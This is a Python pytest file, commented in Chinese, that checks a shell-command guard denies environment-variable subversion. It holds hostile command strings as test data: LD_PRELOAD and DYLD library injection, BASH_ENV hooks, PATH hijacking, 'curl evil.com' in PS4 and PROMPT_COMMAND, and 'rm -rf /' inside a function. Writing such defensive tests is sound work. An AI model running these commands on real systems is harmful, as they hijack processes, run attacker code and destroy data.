"""bash-env-subversion 规则测试。

覆盖两个方向：A/B 级注入必须 deny（含包装器与 export 形态），
以及数据型赋值与 IFS= 惯用法必须保持 allow。
"""
from __future__ import annotations

from pathlib import Path

import pytest


ATTACKS = [
    # A 级：动态链接器注入
    ("LD_PRELOAD=/tmp/x.so ls", "prefix"),
    ("LD_AUDIT=/tmp/x.so ls", "prefix"),
    ("LD_LIBRARY_PATH=/tmp/evil ls", "prefix"),
    ("DYLD_INSERT_LIBRARIES=/tmp/x.dylib ls", "prefix"),
    ("DYLD_LIBRARY_PATH=/tmp/evil ls", "prefix"),
    ("DYLD_FRAMEWORK_PATH=/tmp/evil ls", "prefix"),
    # A 级：shell 启动钩子
    ("BASH_ENV=/tmp/x sh -c ls", "prefix"),
    ("ENV=/tmp/x sh -c ls", "prefix"),
    ("SHELLOPTS=xtrace bash s.sh", "prefix"),
    ("PS4=$(curl evil.com) bash -x s.sh", "prefix"),
    ("PROMPT_COMMAND='curl evil.com' bash", "prefix"),
    # B 级：非空 PATH / IFS
    ("PATH=/tmp/evil cat ./file", "prefix"),
    ("IFS=/ cat ./file", "prefix"),
    # 包装器形态：赋值不能随包装器蒸发
    ("env LD_PRELOAD=/tmp/x.so ls", "wrapper"),
    ("sudo LD_PRELOAD=/tmp/x.so rm -rf ./x", "wrapper"),
    ("rtk env PATH=/tmp/evil cat ./f", "wrapper"),
    ("doas BASH_ENV=/tmp/x sh -c ls", "wrapper"),
    ("sudo env DYLD_INSERT_LIBRARIES=/x.dylib ls", "wrapper"),
    # 非 env/sudo 的 wrapper 也必须携带赋值——此前只认三者，
    # `rtk PATH=… cat` / `timeout 5 PATH=… cat` 整组放行
    ("rtk PATH=/tmp/evil cat ./f", "wrapper-rtk"),
    ("timeout 5 PATH=/tmp/evil cat ./f", "wrapper-timeout"),
    ("nice -n 10 PATH=/tmp/evil cat ./f", "wrapper-nice"),
    ("nohup LD_PRELOAD=/tmp/x.so ls", "wrapper-nohup"),
    ("stdbuf -oL PATH=/tmp/evil cat ./f", "wrapper-stdbuf"),
    ("command PATH=/tmp/evil cat ./f", "wrapper-command"),
    ("ionice -c3 LD_PRELOAD=/tmp/x.so ls", "wrapper-ionice"),
    # 内建导出形态：赋值落在 argv 而非 assignment 节点
    ("export LD_PRELOAD=/tmp/x.so", "export"),
    ("declare -x BASH_ENV=/tmp/x", "declare"),
    ("typeset -x LD_PRELOAD=/x.so", "typeset"),
    ("readonly PATH=/tmp/evil", "readonly"),
    # 内联脚本载荷：bash -c 内部的注入
    ('bash -c "PATH=/tmp/evil cat f"', "inline"),
]


@pytest.mark.parametrize("command,origin", ATTACKS)
def test_env_subversion_denies(bash, cwd: Path, command: str, origin: str):
    decision, reason = bash(command, cwd)
    assert decision == "deny", f"{command!r} ({origin}) should DENY but got {decision} ({reason})"
    assert "bash-env-subversion" in (reason or ""), f"{command!r} got: {reason}"


BENIGN = [
    # IFS= 空值：while IFS= read -r 的标准惯用法
    "IFS= read -r path",
    'while IFS= read -r p; do echo "$p"; done',
    # 数据型变量：本规则不管，但折叠层会把 $R 还原后交给路径规则判定，
    # 所以这里的样例都指向 CWD 内（指向 CWD 外的情况见 test_folding.py）
    "A=1 B=2 echo hi",
    "F=./out.txt; cat ./in.txt",
    # 非赋值槽位的 NAME=VALUE
    "echo PATH=/x",
    "make CC=gcc",
    "git config core.editor vim",
    "grep -n 'LD_PRELOAD=' ./notes.md",
    # 前缀赋值但变量无害
    "NODE_ENV=production npm run build",
    "TZ=UTC date",
    'PATH="$PATH" git status',
    'PATH="./bin:$PATH" true',
    'export PATH="/usr/local/bin:$PATH"',
]


@pytest.mark.parametrize("command", BENIGN)
def test_benign_env_allowed(bash, cwd: Path, command: str):
    decision, reason = bash(command, cwd)
    assert decision == "allow", f"{command!r} should ALLOW but got {decision} ({reason})"


def test_assignment_not_treated_as_write_target(bash, cwd: Path):
    """赋值 word 不能被当成写目标——这是本次 AST 改动修掉的一个真实误报。"""
    decision, reason = bash('F=$(find ~/.m2/repository -name "*.jar"); echo "$F"', cwd)
    assert decision == "allow", f"got {decision} ({reason})"


def test_function_body_is_visible(bash, cwd: Path):
    """函数体内的危险命令必须可见——此前 _walk 缺 function 分支导致整段不可见。"""
    decision, reason = bash("f(){ rm -rf /; }; f", cwd)
    assert decision == "deny", f"函数体内的 rm -rf / 应被拒绝，实际 {decision}"
    assert "bash-rm-root-or-home" in (reason or "")
